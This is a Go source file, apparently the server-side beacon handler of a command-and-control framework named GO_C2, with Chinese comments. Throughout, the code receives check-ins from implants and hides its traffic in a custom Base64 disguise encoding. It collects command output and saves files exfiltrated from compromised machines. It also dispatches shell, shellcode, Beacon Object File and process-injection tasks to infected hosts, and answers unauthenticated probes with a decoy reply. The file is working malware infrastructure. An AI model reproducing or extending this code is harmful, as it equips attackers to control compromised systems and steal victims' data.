package handler

import (
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "os"
    "os/exec"
    "path/filepath"
    "runtime"
    "strings"
    "time"
    "unicode/utf8"

    "github.com/gin-gonic/gin"
    "golang.org/x/text/encoding/simplifiedchinese"

    "GO_C2/config"
    "GO_C2/db"
    "GO_C2/utils"
)

const (
	TASK_TYPE_SHELL     = 1
	TASK_TYPE_DOWNLOAD  = 2
	TASK_TYPE_UPLOAD    = 3
	TASK_TYPE_SCREENSHOT = 4
	TASK_TYPE_PROCESS_LIST = 5
	TASK_TYPE_KILL_PROCESS = 6
	TASK_TYPE_BOF       = 7  // Beacon Object File
	TASK_TYPE_INLINE    = 8  // Inline Execute
	TASK_TYPE_INJECT    = 9  // Process Injection
)

func BeaconHandler(c *gin.Context) {
    token := c.GetHeader("X-Request-ID")
    if !utils.ValidateClientToken(token) { c.JSON(http.StatusUnauthorized, gin.H{"error":"Invalid token"}); return }

    clientId := c.Query("clientId")
    if !utils.ValidateUUID(clientId) { c.String(http.StatusOK, "It's Work!"); return }

    beacon, err := db.GetBeaconByUUID(clientId)
    if err != nil { c.String(http.StatusOK, "It's Work!"); return }

    if err := db.UpdateBeaconLastSeen(clientId); err != nil { c.JSON(http.StatusInternalServerError, gin.H{"error":"Failed to update beacon"}); return }


    if c.Request.Method == http.MethodPost {
        body, err := c.GetRawData(); if err != nil { log.Printf("读取请求数据失败: %v", err); c.JSON(http.StatusBadRequest, gin.H{"error":"Failed to read request data"}); return }
        if len(body) > 0 {
            bodyStr := string(body)
            // 使用自定义 Base64 + Unicode UTF-8 解码
            unwrapped := utils.UnwrapDataFromDisguise(bodyStr)
            
            // 添加调试日志
            log.Printf("BeaconHandler: received POST data from %s, body_length=%d, unwrapped_length=%d", 
                      c.ClientIP(), len(body), len(unwrapped))
            if len(unwrapped) > 0 && len(unwrapped) < 100 {
                log.Printf("BeaconHandler: unwrapped_data='%s'", unwrapped)
            }
            
            // 尝试自定义 Base64 解码
            customDecoded, customErr := utils.CustomBase64Decode(unwrapped)
            
            // 定义 decoded 变量和 decodeOK 标志
            var decoded []byte
            decodeOK := false
            toStore := ""
            
            // 使用自定义 Base64 解码
            if customErr == nil {
                // 优先尝试按 UTF-8 解释；若不是有效 UTF-8，则尝试 GB18030 转换到 UTF-8
                if utf8.Valid(customDecoded) {
                    toStore = string(customDecoded)
                    decoded = customDecoded
                    decodeOK = true
                } else {
                    if gb, err := simplifiedchinese.GB18030.NewDecoder().Bytes(customDecoded); err == nil && utf8.Valid(gb) {
                        toStore = string(gb)
                        decoded = gb
                        decodeOK = true
                    }
                }
            }
            
            // 如果解码失败，回退为 B64:
            if !decodeOK {
                toStore = "B64:" + unwrapped
            }
            
            // 确保 toStore 是有效的 UTF-8 编码
            if !utf8.ValidString(toStore) {
                toStore = string([]rune(toStore))
            }
            
            log.Printf("最终存储内容: %s", toStore)
            
            // 移除旧的分块下载逻辑，使用新的简化下载逻辑
            // 对于其他任务（如命令执行），使用 toStore 更新数据库
            beacon.JobResult = toStore
            
            // 更新数据库中的任务结果
            if err := db.UpdateBeaconJob(beacon.UUID, beacon.JobResult); err != nil {
                log.Printf("更新任务结果失败: %v", err)
            }
            
            // 更新任务历史记录 - 需要从任务历史中获取正确的 ID
            if beacon.CurrentTask != "" {
                // 查找对应的任务历史记录
                if hs, err := db.GetTaskHistoryByBeaconUUID(beacon.UUID); err == nil && len(hs) > 0 {
                    for _, h := range hs {
                        if h.TaskType == beacon.CurrentTask && h.Status == "pending" {
                            if err := db.UpdateBeaconJobResult(clientId, toStore); err != nil {
                                log.Printf("更新任务历史记录失败: %v", err)
                            }
                            break
                        }
                    }
                }
            }
            
            // 处理上传任务的"Upload OK"响应
            if beacon.CurrentTask == "Upload File" && (toStore == "Upload OK" || strings.TrimSpace(toStore) == "Upload OK") {
                // 上传成功，更新任务状态
                log.Printf("Upload task completed successfully for beacon %s", clientId)
            }
            // 如果仍然以 B64: 开头（未能在上面转换为文本），最后再尝试一次用自定义字母表或标准 base64 解码为文本，优先展示可读文本
            if strings.HasPrefix(toStore, "B64:") {
                payload := strings.TrimPrefix(toStore, "B64:")
                if raw, err := utils.CustomBase64Decode(payload); err == nil {
                    if utf8.Valid(raw) {
                        toStore = string(raw)
                    } else {
                        // 尝试 GBK 解码
                        var text string
                        if gb, err := simplifiedchinese.GB18030.NewDecoder().Bytes(raw); err == nil && utf8.Valid(gb) { text = string(gb) }
                        if text != "" { toStore = text }
                    }
                } else if raw2, err2 := utils.CustomBase64Decode(payload); err2 == nil {
                    if utf8.Valid(raw2) { toStore = string(raw2) } else {
                        var text string
                        if gb, err := simplifiedchinese.GB18030.NewDecoder().Bytes(raw2); err == nil && utf8.Valid(gb) { text = string(gb) }
                        if text != "" { toStore = text }
                    }
                }
            }

            // 更新任务结果：增加重试并降级处理，避免单次 DB 连接异常导致整个管线中断
            log.Printf("Beacon Execute Task - Payload: %s, Decoded: %v, DecodeOK: %v", unwrapped, decoded, decodeOK)
            if err := db.UpdateBeaconJobResult(clientId, toStore); err != nil {
                log.Printf("更新任务结果失败: %v", err)
                // 简单重试 2 次，间隔 100ms
                retryOK := false
                for i:=0;i<2;i++ { time.Sleep(100 * time.Millisecond); if e2 := db.UpdateBeaconJobResult(clientId, toStore); e2 == nil { retryOK = true; break } }
                if !retryOK {
                    // 不中断：继续走历史更新与清理，避免卡死后续任务
                    log.Printf("任务结果写入仍失败，继续流程以避免阻塞 [Beacon: %s]", clientId)
                }
            }
            // 推断任务类型供历史/通知使用
            taskLabel := "job"
            if len(beacon.Job) > 0 {
                switch beacon.Job[0] {
                case 0x1B: taskLabel = "Process List"
                case 0x1C: taskLabel = "Shellcode"
                case 0x1D: taskLabel = "Execute"
                case 0x1E: taskLabel = "Kill Process"
                case 0x21: taskLabel = "List Directory"
                case 0x22: taskLabel = "Download File"
                case 0x23: taskLabel = "Upload File"
                case 0x24: taskLabel = "Delete"
                case 0x25: taskLabel = "Mkdir"
                }
            } else if strings.TrimSpace(beacon.CurrentTask) != "" {
                // 当 GET 时已清空 job，使用 current_task 精准匹配
                taskLabel = beacon.CurrentTask
            } else {
                // 如果都没有，尝试从任务历史中推断
                if histories, err := db.GetTaskHistoryByBeaconUUID(clientId); err == nil && len(histories) > 0 {
                    for _, h := range histories {
                        if h.Status == "pending" {
                            taskLabel = h.TaskType
                            break
                        }
                    }
                }
            }
            
            // 特殊处理：如果无法确定任务类型，但数据看起来像文件下载结果，尝试智能识别
            if taskLabel == "job" && (strings.HasPrefix(toStore, "B64:") || len(unwrapped) > 0) {
                log.Printf("Attempting to intelligently identify task type for beacon %s, toStore_prefix=%s, unwrapped=%s", 
                          clientId, toStore[:min(len(toStore), 50)], unwrapped[:min(len(unwrapped), 50)])
                // 尝试从任务历史中查找最近的下载任务
                if histories, err := db.GetTaskHistoryByBeaconUUID(clientId); err == nil && len(histories) > 0 {
                    for _, h := range histories {
                        if h.TaskType == "Download File" && h.Status == "pending" {
                            taskLabel = "Download File"
                            log.Printf("Intelligently identified Download File task from history for beacon %s", clientId)
                            break
                        }
                    }
                }
            }
            
            // 添加调试日志
            log.Printf("Task identification result for beacon %s: taskLabel=%s, beacon.Job_len=%d, beacon.CurrentTask=%s", 
                      clientId, taskLabel, len(beacon.Job), beacon.CurrentTask)
            if b2, err := db.GetBeaconByUUID(clientId); err == nil {
                if taskLabel == "Kill Process" {
                    resultSummary := toStore
                    if strings.HasPrefix(resultSummary, "B64:") { resultSummary = "(binary/base64 data)" } else { resultSummary = truncateString(resultSummary, 200) }
                    go utils.SendJobCompletedMarkdownNotification(b2, taskLabel, "completed", resultSummary)
                }
            }
            // 特殊处理：如果是文件下载任务且返回Base64数据，直接保存文件到storage目录
            if taskLabel == "Download File" && (strings.HasPrefix(toStore, "B64:") || len(unwrapped) > 0) {
                log.Printf("Processing file download result for beacon %s, taskLabel=%s, toStore_prefix=%s, unwrapped=%s", 
                          clientId, taskLabel, toStore[:min(len(toStore), 50)], unwrapped[:min(len(unwrapped), 50)])
                
                // 获取要解码的数据
                var b64Data string
                if strings.HasPrefix(toStore, "B64:") {
                    b64Data = strings.TrimPrefix(toStore, "B64:")
                } else {
                    // 使用原始的unwrapped数据（Base64编码）
                    b64Data = unwrapped
                }
                
                // 解码Base64数据
                decodedData, err := utils.CustomBase64Decode(b64Data)
                if err != nil {
                    log.Printf("Failed to decode download data: %v", err)
                    return
                }
                
                // 从任务历史中获取文件路径信息
                histories, err := db.GetTaskHistoryByBeaconUUID(clientId)
                if err != nil || len(histories) == 0 {
                    log.Printf("Failed to get task history for beacon %s", clientId)
                    return
                }
                
                // 查找最近的下载任务
                var downloadTask *db.TaskHistory
                found := false
                for _, h := range histories {
                    if h.TaskType == "Download File" && h.Status == "pending" {
                        downloadTask = h
                        found = true
                        break
                    }
                }
                
                if !found {
                    log.Printf("No pending download task found for beacon %s", clientId)
                    return
                }
                
                // 从命令中提取文件路径
                filePath := downloadTask.Command
                if strings.HasPrefix(filePath, "Download file ") {
                    filePath = strings.TrimPrefix(filePath, "Download file ")
                }
                
                // 获取文件名
                fileName := filepath.Base(filePath)
                if fileName == "" {
                    fileName = "downloaded_file"
                }
                
                // 确保storage目录存在
                storageDir := fmt.Sprintf("storage/%s", clientId)
                if err := os.MkdirAll(storageDir, 0755); err != nil {
                    log.Printf("Failed to create storage directory %s: %v", storageDir, err)
                    return
                }
                
                // 保存文件到storage目录
                filePathInStorage := filepath.Join(storageDir, fileName)
                if err := os.WriteFile(filePathInStorage, decodedData, 0644); err != nil {
                    log.Printf("Failed to save downloaded file %s: %v", filePathInStorage, err)
                    return
                }
                
                log.Printf("File downloaded successfully: %s -> %s (%d bytes)", filePath, filePathInStorage, len(decodedData))
                
                // 更新任务状态为完成
                if err := db.UpdateTaskHistory(downloadTask.ID, "completed", fmt.Sprintf("File saved to %s", filePathInStorage)); err != nil {
                    log.Printf("Failed to update task history: %v", err)
                }
                
                // 清空beacon的当前任务
                _, _ = db.DB.Exec("UPDATE beacons SET current_task = NULL WHERE uuid = ?", clientId)
                
                log.Printf("File download processing completed for beacon %s", clientId)
                
                // 提供下载链接信息
                downloadURL := fmt.Sprintf("/websafe/api/files/download/%s/%s", clientId, fileName)
                log.Printf("File download URL: %s", downloadURL)
                
                // 自动打开浏览器下载链接（HTTP下载）
                go func() {
                    // 智能构建下载链接
                    var fullURL string
                    
                    if config.GlobalConfig != nil && config.GlobalConfig.Server.Port > 0 {
                        serverPort := config.GlobalConfig.Server.Port
                        
                        // 检查是否有特定的admin监听器配置
                        var adminHost string
                        for _, listener := range config.GlobalConfig.Server.Listeners {
                            if listener.Type == "admin" {
                                adminHost = listener.Host
                                if adminHost == "0.0.0.0" {
                                    adminHost = "localhost"
                                }
                                break
                            }
                        }
                        
                        // 如果没有找到admin监听器，使用默认配置
                        if adminHost == "" {
                            if config.GlobalConfig.Server.Host == "0.0.0.0" {
                                adminHost = "localhost"
                            } else {
                                adminHost = config.GlobalConfig.Server.Host
                            }
                        }
                        
                        fullURL = fmt.Sprintf("http://%s:%d%s", adminHost, serverPort, downloadURL)
                        log.Printf("Using admin listener config: %s", fullURL)
                    } else {
                        // 使用默认配置
                        fullURL = fmt.Sprintf("http://localhost:18080%s", downloadURL)
                        log.Printf("Using default config: %s", fullURL)
                    }
                    
                    log.Printf("Opening browser for HTTP download: %s", fullURL)
                    
                    var cmd *exec.Cmd
                    switch runtime.GOOS {
                    case "windows":
                        cmd = exec.Command("cmd", "/c", "start", fullURL)
                    case "darwin":
                        cmd = exec.Command("open", fullURL)
                    default:
                        cmd = exec.Command("xdg-open", fullURL)
                    }
                    
                    if err := cmd.Run(); err != nil {
                        log.Printf("Failed to open browser: %v", err)
                    } else {
                        log.Printf("Browser opened successfully for HTTP download: %s", fullURL)
                    }
                }()
            }
            
            // 特殊处理：如果是文件信息任务且返回文件信息JSON，开始分块下载
            if taskLabel == "Download Large File" && strings.Contains(toStore, "\"size\":") && strings.Contains(toStore, "\"exists\":true") {
                // 解析文件信息
                var fileInfo struct {
                    Path   string `json:"path"`
                    Size   int64  `json:"size"`
                    Exists bool   `json:"exists"`
                }
                if err := json.Unmarshal([]byte(toStore), &fileInfo); err == nil && fileInfo.Exists {
                    // 开始分块下载
                    log.Printf("File info received, starting chunked download for beacon %s, file: %s, size: %d", clientId, fileInfo.Path, fileInfo.Size)
                    
                    // 查找现有的下载会话
                    if sessions, err := db.GetDownloadSessionsByUUID(clientId); err == nil && len(sessions) > 0 {
                        session := sessions[0] // 使用最新的会话
                        
                        // 计算分块数量
                        chunkSize := int64(8 * 1024 * 1024) // 8MB per chunk
                        totalChunks := (fileInfo.Size + chunkSize - 1) / chunkSize
                        
                        log.Printf("Creating %d download chunks for file %s (size: %d bytes)", totalChunks, fileInfo.Path, fileInfo.Size)
                        
                        // 创建分块下载任务
                        for i := int64(0); i < totalChunks; i++ {
                            offset := i * chunkSize
                            length := chunkSize
                            if offset+length > fileInfo.Size {
                                length = fileInfo.Size - offset
                            }
                            
                            // 构造下载任务
                            downloadTask := fmt.Sprintf("RANGE %d %d\n%s", offset, length, fileInfo.Path)
                            jobData := string(append([]byte{0x22}, []byte(downloadTask)...))
                            
                            // 添加到任务队列
                            if err := db.AddTaskToQueue(clientId, 0x22, jobData, int(i)); err != nil {
                                log.Printf("Failed to add download chunk task %d: %v", i, err)
                            } else {
                                log.Printf("Added download chunk task %d to queue for beacon %s", i, clientId)
                            }
                        }
                        
                        // 更新会话的分块数量
                        if err := db.UpdateDownloadSessionChunks(session.ID, int(totalChunks)); err != nil {
                            log.Printf("Failed to update download session chunks: %v", err)
                        }
                        
                        log.Printf("Created %d download chunks for session %d", totalChunks, session.ID)
                    } else {
                        log.Printf("No download session found for beacon %s", clientId)
                    }
                } else {
                    log.Printf("Failed to parse file info for beacon %s: %v", clientId, err)
                }
            }
            
            // 特殊处理：如果是文件上传任务且返回"Upload OK"，检查是否需要下发下一个分块
            if taskLabel == "Upload File" && strings.TrimSpace(toStore) == "Upload OK" {
                // 查找当前beacon的待处理任务
                if task, err := db.GetNextPendingTask(clientId); err == nil && task != nil {
                    if task.TaskType == 0x23 && strings.Contains(task.TaskData, "CHUNK") {
                        // 有下一个分块任务，立即下发
                        log.Printf("Upload chunk completed, sending next chunk for beacon %s", clientId)
                        if err := db.UpdateBeaconJob(clientId, task.TaskData); err != nil {
                            log.Printf("Failed to send next chunk: %v", err)
                        } else {
                            // 标记任务为处理中
                            db.MarkTaskAsProcessing(task.ID)
                            log.Printf("Next chunk sent to beacon %s", clientId)
                        }
                    } else {
                        // 没有更多分块，完成上传
                        log.Printf("All chunks uploaded for beacon %s", clientId)
                        updateLatestTaskHistory(clientId, taskLabel, "completed", toStore)
                        if err := db.UpdateBeaconJob(clientId, ""); err != nil {
                            log.Printf("清空任务失败: %v", err)
                        }
                        _, _ = db.DB.Exec("UPDATE beacons SET current_task = NULL WHERE uuid = ?", clientId)
                    }
                } else {
                    // 没有更多任务，完成上传
                    log.Printf("No more chunks, upload completed for beacon %s", clientId)
                    updateLatestTaskHistory(clientId, taskLabel, "completed", toStore)
                    if err := db.UpdateBeaconJob(clientId, ""); err != nil {
                        log.Printf("清空任务失败: %v", err)
                    }
                    _, _ = db.DB.Exec("UPDATE beacons SET current_task = NULL WHERE uuid = ?", clientId)
                }
            } else {
                // 其他任务正常处理
                updateLatestTaskHistory(clientId, taskLabel, "completed", toStore)
                if err := db.UpdateBeaconJob(clientId, ""); err != nil {
                    log.Printf("清空任务失败: %v", err)
                }
                _, _ = db.DB.Exec("UPDATE beacons SET current_task = NULL WHERE uuid = ?", clientId)
                log.Printf("任务执行完成，已清空任务 [Beacon: %s]", clientId)
            }
        }
    }

    // 优先检查任务队列，如果没有任务再检查旧的beacon.Job字段
    if task, err := db.GetNextPendingTask(clientId); err == nil && task != nil {
        // 有新任务，标记为处理中并下发
        if err := db.MarkTaskAsProcessing(task.ID); err != nil {
            log.Printf("Failed to mark task as processing: %v", err)
        }
        
        // 更新beacon的当前任务
        _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Processing Task", clientId)
        
        log.Printf("Sending task from queue to beacon %s: %s", clientId, task.TaskData[:100])
        wrapped := utils.WrapDataWithDisguise(task.TaskData)
        c.String(http.StatusOK, wrapped)
        return
    }
    
    // 如果没有队列任务，检查旧的beacon.Job字段
    if beacon.Job != "" {
        job := beacon.Job
        if err := db.UpdateBeaconJob(clientId, ""); err != nil { 
            log.Printf("清空任务失败: %v", err) 
        } else { 
            log.Printf("任务已下发，已清空任务 [Beacon: %s]", clientId) 
        }
        wrapped := utils.WrapDataWithDisguise(job)
        c.String(http.StatusOK, wrapped)
        return
    }
    
    // 长轮询：若当前无任务，阻塞等待一段时间（最多 ~8s），期间若有新任务下发则立即返回
    deadline := time.Now().Add(8 * time.Second)
    for time.Now().Before(deadline) {
        // 检查任务队列
        if task, err := db.GetNextPendingTask(clientId); err == nil && task != nil {
            if err := db.MarkTaskAsProcessing(task.ID); err != nil {
                log.Printf("Failed to mark task as processing: %v", err)
            }
            _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Processing Task", clientId)
            log.Printf("New task arrived during polling for beacon %s", clientId)
            wrapped := utils.WrapDataWithDisguise(task.TaskData)
            c.String(http.StatusOK, wrapped)
            return
        }
        
        // 检查旧的beacon.Job字段
        if b2, err := db.GetBeaconByUUID(clientId); err == nil && b2.Job != "" {
            wrapped := utils.WrapDataWithDisguise(b2.Job)
            c.String(http.StatusOK, wrapped)
            return
        }
        
        time.Sleep(200 * time.Millisecond)
    }
    
    c.String(http.StatusOK, "")
}

func updateLatestTaskHistory(beaconUUID, taskType, status, result string) {
    histories, err := db.GetTaskHistoryByBeaconUUID(beaconUUID)
    if err != nil { log.Printf("Failed to get task history for beacon %s: %v", beaconUUID, err); return }
    if len(histories) == 0 { log.Printf("No task history found for beacon %s", beaconUUID); return }
    // 找到最近一条对应类型且 pending 的历史记录
    var target *db.TaskHistory
    found := false
    for _, h := range histories {
        if h.TaskType == taskType && h.Status == "pending" { 
            target = h
            found = true
            break 
        }
    }
    if !found { target = histories[0] }
    if err := db.UpdateTaskHistory(target.ID, status, result); err != nil { log.Printf("Failed to update task history %d: %v", target.ID, err) } else { log.Printf("Updated task history %d to status: %s", target.ID, status) }
}

func truncateString(s string, maxLen int) string { if len(s) <= maxLen { return s }; return s[:maxLen] + "..." }

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}

// handleBOFTask 处理BOF任务
func handleBOFTask(c *gin.Context, beacon *db.Beacon, taskData string) {
	var bofReq struct {
		EntryPoint int    `json:"entry_point"`
		Code       string `json:"code"`        // Base64编码的代码段
		RData      string `json:"rdata"`      // Base64编码的只读数据段
		Data       string `json:"data"`       // Base64编码的数据段
		Relocs     string `json:"relocs"`     // Base64编码的重定位信息
		Args       string `json:"args"`       // 参数数据
	}
	
	if err := json.Unmarshal([]byte(taskData), &bofReq); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid BOF data format"})
		return
	}
	
	// 记录任务历史
	history := &db.TaskHistory{
		BeaconUUID: beacon.UUID,
		TaskType:   "BOF",
		Command:    fmt.Sprintf("BOF execution with entry point: %d", bofReq.EntryPoint),
		Status:     "pending",
		CreatedAt:  time.Now(),
		UpdatedAt:  time.Now(),
	}
	
	if err := db.CreateTaskHistory(history); err != nil {
		log.Printf("Failed to create BOF task history: %v", err)
	}
	
	// 返回BOF任务数据给beacon
	c.JSON(http.StatusOK, gin.H{
		"task_type": TASK_TYPE_BOF,
		"entry_point": bofReq.EntryPoint,
		"code": bofReq.Code,
		"rdata": bofReq.RData,
		"data": bofReq.Data,
		"relocs": bofReq.Relocs,
		"args": bofReq.Args,
	})
}

// handleInlineTask 处理Inline执行任务
func handleInlineTask(c *gin.Context, beacon *db.Beacon, taskData string) {
	var inlineReq struct {
		Payload string `json:"payload"` // Base64编码的shellcode
		Args    string `json:"args"`    // 参数数据
	}
	
	if err := json.Unmarshal([]byte(taskData), &inlineReq); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid inline data format"})
		return
	}
	
	// 记录任务历史
	history := &db.TaskHistory{
		BeaconUUID: beacon.UUID,
		TaskType:   "Inline Execute",
		Command:    "Inline shellcode execution",
		Status:     "pending",
		CreatedAt:  time.Now(),
		UpdatedAt:  time.Now(),
	}
	
	if err := db.CreateTaskHistory(history); err != nil {
		log.Printf("Failed to create inline task history: %v", err)
	}
	
	// 返回inline任务数据给beacon
	c.JSON(http.StatusOK, gin.H{
		"task_type": TASK_TYPE_INLINE,
		"payload": inlineReq.Payload,
		"args": inlineReq.Args,
	})
}

// handleInjectTask 处理进程注入任务
func handleInjectTask(c *gin.Context, beacon *db.Beacon, taskData string) {
	var injectReq struct {
		TargetPID int    `json:"target_pid"`  // 目标进程ID
		Payload   string `json:"payload"`     // Base64编码的注入代码
		Offset    int    `json:"offset"`      // 代码偏移量
		Args      string `json:"args"`        // 参数数据
		Method    string `json:"method"`      // 注入方法 (createthread, apc, etc.)
	}
	
	if err := json.Unmarshal([]byte(taskData), &injectReq); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid inject data format"})
		return
	}
	
	// 记录任务历史
	history := &db.TaskHistory{
		BeaconUUID: beacon.UUID,
		TaskType:   "Process Injection",
		Command:    fmt.Sprintf("Inject into PID %d using %s method", injectReq.TargetPID, injectReq.Method),
		Status:     "pending",
		CreatedAt:  time.Now(),
		UpdatedAt:  time.Now(),
	}
	
	if err := db.CreateTaskHistory(history); err != nil {
		log.Printf("Failed to create inject task history: %v", err)
	}
	
	// 返回注入任务数据给beacon
	c.JSON(http.StatusOK, gin.H{
		"task_type": TASK_TYPE_INJECT,
		"target_pid": injectReq.TargetPID,
		"payload": injectReq.Payload,
		"offset": injectReq.Offset,
		"args": injectReq.Args,
		"method": injectReq.Method,
	})
}



